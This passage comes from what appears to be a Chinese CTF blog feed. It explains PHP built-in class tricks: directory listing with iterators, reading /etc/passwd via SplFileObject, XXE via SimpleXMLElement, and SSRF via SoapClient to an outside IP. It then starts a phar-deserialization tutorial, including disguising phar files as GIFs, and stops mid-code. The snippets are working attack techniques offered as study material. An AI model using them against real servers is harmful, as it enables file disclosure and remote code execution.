class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这一题就可以使用这个特性去绕过哈希比较，我在另一篇文章写了，此处不再重复</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure><h3 id="使用DirectaryIterator、Filesystemlterator、Globlterator内置类读目录"><a href="#使用DirectaryIterator、Filesystemlterator、Globlterator内置类读目录" class="headerlink" title="使用DirectaryIterator、Filesystemlterator、Globlterator内置类读目录"></a>使用DirectaryIterator、Filesystemlterator、Globlterator内置类读目录</h3><h4 id="Directorylterator"><a href="#Directorylterator" class="headerlink" title="Directorylterator"></a>Directorylterator</h4><ul><li>(PHP 5, PHP 7, PHP 8)</li></ul><p><code>DirectoryIterator</code>与<code>glob://协议</code>结合可以进行目录读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$leekos</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;leekos&#x27;</span>];<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-variable">$leekos</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/30/98ehFsSuLtb3dKQ.png" alt="image-20230530185328183"></p><p>成功读取到根目录的文件</p><h4 id="FilesystemIterator"><a href="#FilesystemIterator" class="headerlink" title="FilesystemIterator"></a>FilesystemIterator</h4><ul><li>(PHP 5 &gt;&#x3D; 5.3.0, PHP 7, PHP 8)</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FilesystemIterator</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">DirectoryIterator</span></span><br></code></pre></td></tr></table></figure><p>从官方文档看出这两个类是继承关系，<code>FilesystemIterator</code>内置类也有一个 <code>__toString()</code> 方法</p><p>我们同样可以使用<code>glob伪协议</code>读取目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$leekos</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;leekos&#x27;</span>];<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-variable">$leekos</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/30/TM9FtNOAUKVPirR.png" alt="image-20230530185704719"></p><p>并且从图中就可以看出这两个原生类的些许区别了，<code>Filesystemlterator</code>会以绝对路径的形式展现，而<code>DirectoryIterator</code>仅显示出当前目录下的文件信息</p><h4 id="一句话DirectoryIterator、Filesystemlterator"><a href="#一句话DirectoryIterator、Filesystemlterator" class="headerlink" title="一句话DirectoryIterator、Filesystemlterator"></a>一句话DirectoryIterator、Filesystemlterator</h4><p><strong>DirectoryIterator</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">DirectoryIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><p><strong>FilesystemIterator</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">FilesystemIterator</span>(<span class="hljs-string">&quot;glob:///*&quot;</span>);<span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<span class="hljs-keyword">echo</span>(<span class="hljs-variable">$f</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&#x27;&lt;br&gt;&#x27;</span>);&#125;<br></code></pre></td></tr></table></figure><h4 id="Globlterator"><a href="#Globlterator" class="headerlink" title="Globlterator"></a>Globlterator</h4><ul><li>(PHP 5 &gt;&#x3D; 5.3.0, PHP 7, PHP 8)</li></ul><p>与前两个类的作用相似，<code>GlobIterator</code> 类也是可以遍历一个文件目录，使用方法与前两个类也基本相似。但与上面略不同的是其行为类似于使用 <code>glob()</code> 函数，可以通过模式匹配来寻找文件路径。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$leekos</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;leekos&#x27;</span>];<br><span class="hljs-variable">$obj</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">GlobIterator</span>(<span class="hljs-variable">$leekos</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$obj</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$o</span>) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$o</span>-&gt;<span class="hljs-title function_ invoke__">__toString</span>().<span class="hljs-string">&quot;&lt;br/&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/05/30/pdQVroSUlCnDq85.png" alt="image-20230530190416823" style="zoom:50%;" /><p>看了一下文档发现该原生类是继承FilesystemIterator的，所以也是以绝对路径显示的</p><p>（需要注意的是，我们使用GlobIterator只需要输入路径即可，不需要添加glob:&#x2F;&#x2F;）</p><h4 id="SplFileObject-读取文件内容"><a href="#SplFileObject-读取文件内容" class="headerlink" title="SplFileObject 读取文件内容"></a>SplFileObject 读取文件内容</h4><ul><li>(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8)</li></ul><p>SplFileObject内置类存在 <code>__toString()</code>方法</p><p>使用<code>SplFileObject</code>类读取 <code>/etc/passwd</code>文件内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br><span class="hljs-variable">$leekos</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;leekos&#x27;</span>];<br><span class="hljs-variable">$context</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">SplFileObject</span>(<span class="hljs-variable">$leekos</span>);<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$context</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$f</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$f</span>;<br>&#125;<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/05/30/wDvIQibhsj5WHnS.png" alt="image-20230530200204445" style="zoom:50%;" /><h3 id="使用SimpleXMLElement类进行XXE"><a href="#使用SimpleXMLElement类进行XXE" class="headerlink" title="使用SimpleXMLElement类进行XXE"></a>使用SimpleXMLElement类进行XXE</h3><p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p><p><img src="https://s2.loli.net/2023/05/30/2niyHx1mhNKMaDe.png" alt="image-20230530201752914"></p><p><img src="https://s2.loli.net/2023/05/30/P5smgX4ASREOHwc.png" alt="image-20230530201800846"></p><p>可以看到当我们设置SimpleXMLElement类构造方法的 <code>data_is_url</code>参数为：<code>true</code> 时，我们可以实现远程包含xml文件，然后<code>data</code>参数就设置为xml的远程地址即可，第2个参数我们设置为2即可</p><p>然后我们xml文件外带数据进行xxe即可</p><h3 id="使用SoapClient类进行SSRF"><a href="#使用SoapClient类进行SSRF" class="headerlink" title="使用SoapClient类进行SSRF"></a>使用SoapClient类进行SSRF</h3><ul><li>（PHP 5、PHP 7、PHP 8）</li></ul><blockquote><p>SoapClient 类为<a href="http://www.w3.org/TR/soap11/">» SOAP 1.1</a>、 <a href="http://www.w3.org/TR/soap12/">» SOAP 1.2</a>服务器提供客户端。它可以在 WSDL 或非 WSDL 模式下使用。</p></blockquote><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端</p><p><code>SoapClient</code>类的构造函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> SoapClient :: <span class="hljs-title function_ invoke__">SoapClient</span>(<span class="hljs-keyword">mixed</span> <span class="hljs-variable">$wsdl</span> [，<span class="hljs-keyword">array</span> <span class="hljs-variable">$options</span> ])<br></code></pre></td></tr></table></figure><ul><li>第一个参数是用来指明是否是wsdl模式，将该值设为<strong>null</strong>则表示非wsdl模式。</li><li>第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则<strong>必须设置location和uri选项</strong>，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。</li></ul><p>SoapClient类还有一个 <code>__call()</code>方法，当我们调用对象中不存在的方法时会触发 <code>__call()</code>方法</p><p>当 <code>__call()</code> 方法被触发后，可以发送http、https请求。正是由于这个方法，可以导致SSRF漏洞</p><p>我们测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span>  <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;location&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://49.235.108.15:9996/aaa&#x27;</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt;<span class="hljs-string">&#x27;http://49.235.108.15:9996&#x27;</span>));<br><span class="hljs-variable">$b</span> =  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);<br><br><span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>(); <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span><br></code></pre></td></tr></table></figure><p>首先在服务器监听9996端口，运行代码：</p><p><img src="https://s2.loli.net/2023/05/30/cfgYlXbJZsOLi8v.png" alt="image-20230530205423625"></p><p>服务器成功收到请求</p><p>但是它只局限于http、https协议，没什么用。</p><p>如果存在<strong>CRLF漏洞</strong>(\r\n)，我们可以通过 SSRF+CRLF组合拳插入任意的HTTP头</p><h3 id="ReflectionMethod内置类获取注释内容"><a href="#ReflectionMethod内置类获取注释内容" class="headerlink" title="ReflectionMethod内置类获取注释内容"></a>ReflectionMethod内置类获取注释内容</h3><ul><li>(PHP 5 &gt;&#x3D; 5.1.0, PHP 7, PHP 8)</li></ul><p><code>ReflectionFunction</code>类的<code>getDocComment()</code>方法可以获取注释内容</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">ReflectionFunctionAbstract</span>::<span class="hljs-title function_ invoke__">getDocComment</span>(): <span class="hljs-keyword">string</span>|<span class="hljs-literal">false</span><br>    <span class="hljs-comment">//从函数中获取文档注释</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php内置类小结</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>phar反序列化总结</title>
    <link href="/2023/08/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/"/>
    <url>/2023/08/24/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="phar反序列化总结"><a href="#phar反序列化总结" class="headerlink" title="phar反序列化总结"></a>phar反序列化总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>php中很多都是使用<code>unserialize()</code>进行反序列化，但是有些是不需要使用这个函数也能进行反序列化的。</p><p>我们可以使用<code>phar文件</code>结合<code>相关函数</code>进行反序列化，此处我们讲解phar反序列化。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>在讲解之前，我们需要知道什么是<code>phar</code>，Phar是将php文件打包成的一种压缩文档，类似java中的jar包。它的特性就是phar文件会以反序列化的形式存储用户自定义的<code>meta-data</code>。配合<code>phar://伪协议</code>使用。</p><p>（简单来说，phar文件就是php的压缩文件，并且可以不经过解压就被php文件访问执行）</p><h3 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h3><blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">php</span>.ini中设置为phar.readonly=<span class="hljs-literal">Off</span><br><span class="hljs-attribute">php</span> version&gt;=<span class="hljs-number">5</span>.<span class="hljs-number">3</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="phar组成结构"><a href="#phar组成结构" class="headerlink" title="phar组成结构"></a>phar组成结构</h3><table><thead><tr><th>属性</th><th>解释</th></tr></thead><tbody><tr><td>stub</td><td>它是<code>phar</code>的文件标识，格式：<code>xxx&lt;?php xxx; __HALT_COMPLILER();?&gt;</code></td></tr><tr><td>manifest</td><td>就是<code>meta-data</code>,存放压缩文件信息，以序列化方式存储</td></tr><tr><td>contents</td><td>压缩文件的内容</td></tr><tr><td>signature</td><td>签名，放在文件末尾</td></tr></tbody></table><p>这里需要注意：</p><blockquote><p>1、文件标识：phar文件标识放在文件的头部，但是必须以 <code>__HALT_COMPILER();?&gt;</code>结尾，前面没有限制，这就意味着我们可以将phar文件进行伪造，添加一些图片或其他文件的头标志信息来绕过一些限制。</p><p>2、反序列化，phar存储的<code>meta-data</code>信息以序列化方式存储，当某一些<strong>特定的文件操作函数</strong>，</p><p>使用<code>phar://伪协议</code>来解析phar文件时，会将数据反序列化。</p></blockquote><p>这样的文件操作函数有很多：</p><p><img src="https://s2.loli.net/2023/03/23/JlVktEbKgiWGAeH.png" alt="20191112145239-0436a1c4-0519-1"></p><p>这些函数配合<code>phar://伪协议</code>时，就会反序列化数据</p><h3 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h3><p>我们可以使用php提供的内置类<code>Phar</code>来生成phar文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//先删除存在的phar.phar</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行代码，就生成了一个phar文件：</p><p><img src="https://s2.loli.net/2023/03/23/W9szSLkoGtvm2j5.png" alt="image-20230323144009160"></p><p>我们看到，<code>meta-data</code>中的数据确实是被序列化存储</p><h3 id="phar反序列化漏洞"><a href="#phar反序列化漏洞" class="headerlink" title="phar反序列化漏洞"></a>phar反序列化漏洞</h3><p>有序列化的地方，就会存在反序列化。当<code>特定文件操作函数</code>通过<code>phar://伪协议</code>去解析phar文件时，就会将phar中数据反序列化</p><p>我们使用如下代码生成phar文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker&quot;</span>;<br>        &#125;<br>    &#125;<br><br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//先删除存在的phar.phar</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TestObject</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-comment">//签名自动计算</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>执行后，在当前目录生成了一个<code>phar.phar</code>文件</p><p>我们使用如下代码，证明反序列化（此处选取<code>file_exists()</code>函数）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nb plus!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;phar://phar.phar&quot;</span>;<br>    <span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$f</span>);<br><br>输出：<br>nb plus!<br></code></pre></td></tr></table></figure><p>当文件系统函数的参数可控时，我们可以在不调用<code>unserialize()</code>的情况下进行反序列化操作,极大的拓展了攻击面，其它函数也是可以的，比如<code>is_dir</code>、<code>file_get_contents()</code>函数,代码如下:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>       <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;nb plus!&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-variable">$f</span> = <span class="hljs-string">&quot;phar://phar.phar&quot;</span>;<br>    <span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$f</span>);<br></code></pre></td></tr></table></figure><h3 id="phar伪装成其他文件"><a href="#phar伪装成其他文件" class="headerlink" title="phar伪装成其他文件"></a>phar伪装成其他文件</h3><p>有时我们可以结合文件上传和文件包含去执行反序列化漏洞，但是上传phar文件被过滤了，我们必须伪装成其他文件，例如gif、png等图片(检查文件类型)</p><p>在前面分析时，我们知道，php分析phar文件是根据<code>stub属性</code>，stub必须以<code>__HALT_COMPILER();?&gt; </code>结尾。</p><p>对前面的内容、文件后缀是没有要求的，我们可以<code>添加文件头+修改文件后缀</code>伪装成其他文件</p><p>示范一下伪装成GIF：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestObject</span> </span>&#123;<br>    &#125;<br>    @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);  <span class="hljs-comment">//先删除存在的phar.phar</span><br>    <span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>); <span class="hljs-comment">//后缀名必须为phar</span><br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br>    <span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&#x27;&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>); <span class="hljs-comment">//设置stub</span><br>    <span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span 